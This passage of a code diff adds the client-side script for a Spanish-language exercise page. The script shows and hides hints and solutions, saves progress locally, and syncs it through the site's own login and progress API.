+      var btnSol = exercise.querySelector(".btn-sol");
+      var check = exercise.querySelector(".check-done input");
+
+      if (btnHint && hint) {
+        btnHint.addEventListener("click", function () {
+          setPanel(exercise, "hint", hint.classList.contains("hidden"));
+        });
+      }
+      if (btnSol && solution) {
+        btnSol.addEventListener("click", function () {
+          setPanel(exercise, "sol", solution.classList.contains("hidden"));
+        });
+      }
+
+      if (check) {
+        check.addEventListener("change", function () {
+          exercise.classList.toggle("done", check.checked);
+          var i = state.done.indexOf(id);
+          if (check.checked && i === -1) state.done.push(id);
+          if (!check.checked && i !== -1) state.done.splice(i, 1);
+          saveState(state);
+          renderProgress();
+        });
+      }
+
+      if (state.done.indexOf(id) !== -1) {
+        exercise.classList.add("done");
+        if (check) check.checked = true;
+      }
+      if (state.open.indexOf(id + ":hint") !== -1 && hint) {
+        hint.classList.remove("hidden");
+        if (btnHint) btnHint.textContent = LABELS.hint.hide;
+      }
+      if (state.open.indexOf(id + ":sol") !== -1 && solution) {
+        solution.classList.remove("hidden");
+        if (btnSol) btnSol.textContent = LABELS.sol.hide;
+      }
+    });
+  }
+
+  /* Fusiona nube+local y pinta. */
+  function applyStateToDom() {
+    document.querySelectorAll(".exercise").forEach(function (exercise) {
+      var id = exercise.getAttribute("data-ex");
+      var isDone = state.done.indexOf(id) !== -1;
+      exercise.classList.toggle("done", isDone);
+      var check = exercise.querySelector(".check-done input");
+      if (check) check.checked = isDone;
+      var hint = exercise.querySelector(".hint");
+      var solution = exercise.querySelector(".solution");
+      var btnHint = exercise.querySelector(".btn-hint");
+      var btnSol = exercise.querySelector(".btn-sol");
+      var hintOpen = state.open.indexOf(id + ":hint") !== -1;
+      var solOpen = state.open.indexOf(id + ":sol") !== -1;
+      if (hint) hint.classList.toggle("hidden", !hintOpen);
+      if (solution) solution.classList.toggle("hidden", !solOpen);
+      if (btnHint) btnHint.textContent = hintOpen ? LABELS.hint.hide : LABELS.hint.show;
+      if (btnSol) btnSol.textContent = solOpen ? LABELS.sol.hide : LABELS.sol.show;
+    });
+    renderProgress();
+  }
+  function setLoggedIn(email) {
+    session.active = true;
+    session.email = email;
+    var authArea = document.getElementById("authArea");
+    var userArea = document.getElementById("userArea");
+    var emailEl = document.getElementById("authUserEmail");
+    if (authArea) authArea.classList.add("hidden");
+    if (userArea) userArea.classList.remove("hidden");
+    if (emailEl) emailEl.textContent = email;
+  }
+  function setLoggedOut(msg) {
+    session.active = false;
+    session.email = null;
+    var authArea = document.getElementById("authArea");
+    var userArea = document.getElementById("userArea");
+    if (authArea) authArea.classList.remove("hidden");
+    if (userArea) userArea.classList.add("hidden");
+    setSync("idle", msg || "Modo local: tu avance vive en este dispositivo.");
+  }
+  function saveStateLocalOnly() {
+    try {
+      localStorage.setItem(KEY, JSON.stringify(state));
+    } catch (err) {
+      /* sin persistencia: se continua solo en memoria */
+    }
+  }
+  function pullAndMerge() {
+    setSync("busy", "Cargando tu avance de la nube...");
+    api("/api/progress").then(function (r) {
+      if (r.status === 200) {
+        state.done = union(state.done, r.body.done);
+        state.open = union(state.open, r.body.open);
+        saveStateLocalOnly();
+        applyStateToDom();
+        pushState();
+      } else {
+        setSync("err", "No se pudo leer la nube. Sigues en local.");
+      }
+    }).catch(function () {
+      setSync("err", "Sin conexion con la nube. Sigues en local.");
+    });
+  }
+  function initAuth() {
+    var emailInput = document.getElementById("authEmail");
+    var passInput = document.getElementById("authPass");
+    var btnLogin = document.getElementById("btnLogin");
+    var btnRegister = document.getElementById("btnRegister");
+    var btnLogout = document.getElementById("btnLogout");
+    function doAuth(path) {
+      var email = emailInput ? emailInput.value.trim() : "";
+      var password = passInput ? passInput.value : "";
+      if (!email || password.length < 8) {
+        setSync("err", "Escribe tu email y una clave de 8+ caracteres.");
+        return;
+      }
+      setSync("busy", "Conectando...");
+      api(path, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ email: email, password: password })
+      }).then(function (r) {
+        if (r.status === 200 || r.status === 201) {
+          if (passInput) passInput.value = "";
+          setLoggedIn(r.body.email);
+          pullAndMerge();
+        } else {
+          setSync("err", (r.body && r.body.error) || "No se pudo entrar.");
+        }
+      }).catch(function () {
+        setSync("err", "Sin conexion. Revisa tu red e intenta de nuevo.");
+      });
+    }
+    if (btnLogin) btnLogin.addEventListener("click", function () { doAuth("/api/auth/login"); });
+    if (btnRegister) btnRegister.addEventListener("click", function () { doAuth("/api/auth/register"); });
+    if (btnLogout) btnLogout.addEventListener("click", function () {
+      api("/api/auth/logout", { method: "POST" }).catch(function () {});
+      setLoggedOut("Sesion cerrada. Sigues en modo local.");
+    });
+    function paintOffline() {
+      document.body.classList.toggle("offline", !navigator.onLine);
+      if (!navigator.onLine) {
+        setSync("err", "Sin internet: avanzas en local y se sincroniza al volver.");
+      } else if (session.active) {
+        pushState();
+      }
+    }
+    window.addEventListener("online", paintOffline);
+    window.addEventListener("offline", paintOffline);
+    paintOffline();
+    api("/api/auth/me").then(function (r) {
+      if (r.status === 200 && r.body && r.body.email) {
+        setLoggedIn(r.body.email);
+        pullAndMerge();
+      }
+    }).catch(function () {
+      /* Sin API (archivo local) o sin red: modo local. */
+    });
+  }
+  /* Tres botones globales del header. */
+  function initGlobalButtons() {
+    var showAll = document.getElementById("showAll");
+    var hideAll = document.getElementById("hideAll");
+    var resetAll = document.getElementById("resetAll");
+
+    if (showAll) {
+      showAll.addEventListener("click", function () {
+        document.querySelectorAll(".exercise").forEach(function (exercise) {
+          setPanel(exercise, "hint", true);
+          setPanel(exercise, "sol", true);
+        });
+      });
+    }
+    if (hideAll) {
+      hideAll.addEventListener("click", function () {
+        document.querySelectorAll(".exercise").forEach(function (exercise) {
+          setPanel(exercise, "hint", false);
+          setPanel(exercise, "sol", false);
+        });
+      });
+    }
+    if (resetAll) {
+      resetAll.addEventListener("click", function () {
+        try {
+          localStorage.removeItem(KEY);
+        } catch (err) {
+          /* sin almacenamiento: solo se recarga la pagina */
+        }
+        location.reload();
+      });
+    }
+  }
+
+  /* Arranque: engancha todo y pinta el progreso inicial. */
+  initExercises();
+  initGlobalButtons();
+  renderProgress();
+  initAuth();
+})();
+</script>
+</body>
+</html>
